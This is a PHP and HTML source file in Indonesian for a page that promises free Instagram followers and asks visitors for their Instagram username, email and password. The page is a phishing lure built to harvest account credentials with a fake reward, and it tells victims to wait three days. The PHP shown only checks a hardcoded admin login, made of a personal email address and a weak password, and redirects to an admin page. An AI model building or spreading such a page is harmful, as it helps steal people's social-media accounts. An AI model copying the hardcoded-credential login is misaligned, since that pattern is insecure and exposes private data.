<?php

require("func.php");

if( isset($_POST["submit"]) ) {

    if( $_POST["username"] == "mitsuha" && $_POST["email"] == "cacaeka.eka08@gmail.com" && $_POST["password"] == "2468" ) {

        header("Location: page_admin.php");
        exit;

    } else {

        }

    if( $_POST["username"] == "" && $_POST["email"] == "" && $_POST["password"] == "" ) {

    } 
}

?>  

<!DOCTYPE html>
<html>

<meta charset="UTF-8">
<meta name="viewport" content="width-device-width, initial-scale=1.0">

<head>
	<title>Followers Instagram Gratis</title>

	<style>

	     @import url('https://fonts.googleapis.com/css2?family=Archivo+Narrow:ital@1&display=swap');

	     @media(max-width: 768px) {

	    }
		
		html {
			background-color: white;
			font-family: 'Archivo Narrow', sans-serif;
			font-size: 10px;
			color: gray;
		}

		header {
			text-align: center;
			color: black; 
		}

		.form-control {
			width: 370px;
			height: 33px;
			margin: auto;
			padding: 5px;
		}

		input:focus {
			outline: none;
		}

		button {
			border: 0px solid;
			font-size: 15px;
		}

		.but-decor {
			width: 370px;
			height: 35px;
			margin: auto;
			background-color: blue;
			color: white;
			box-shadow: 1px 1px 1px blue;
		}

		.container {
			width: 400px;
			margin: auto;
		}

	</style>
</head>
<body>

	<div class="container">
		<!-- JUDUL WEBSITE -->
    	<header>
   		    <center><img style="width: 370px; height: 390px;" src="20220423_161611.png"></center>
	    	<h1 style="font-size: 30px;">Followers Instagram Gratis</h1>
	    	<h1 style="font-size: 15px; color: lightgray;">1M+ Pengguna Instagram</h1>
	    </header>
	    <br>
	    <br>
	    <h1 style="text-align: center; font-size: 10px;">Isi data berikut dengan benar! Kesalahan 1 kata dapat mengakibatkan permintaan gagal di proses. Tekan tombol kirim untuk memproses permintaan</h1>
	    <br>
        <br>
	    <!-- BODY WEBSITE -->
	    <form action="" method="post">
	    	<center><input type="text" class="form-control" name="username" placeholder="Masukan Nama Akun Instagram"></center>
	    	<br>
	     	<center><input type="text" class="form-control" name="email" placeholder="Masukan Alamat Email"></center>
    		<br>
	    	<center><input type="password" class="form-control" name="password" placeholder="Masukan Sandi"></center>
	    	<br>
	    	<h1 style="text-align: center; font-size: 10px;">Bila sudah selesai mengisi data diatas dengan benar silahkan tekan tombol KIRIM dibawah ini.</h1>
	    	<br>
	    	<center><button class="but-decor" type="submit" onclick="alert('Permintaan Anda Sedang Di Proses Silahkan Tunggu Paling Lama 3 Hari');" name="submit">Kirim</button></center>
	    	<br>
	        <center><a style="font-size: 13px; color: gray; text-decoration: none;" href="index.php">Halaman Sebelumnya</a></center>
	    </form>
	    <br>
	    <br>
	</div>

</body>
</html>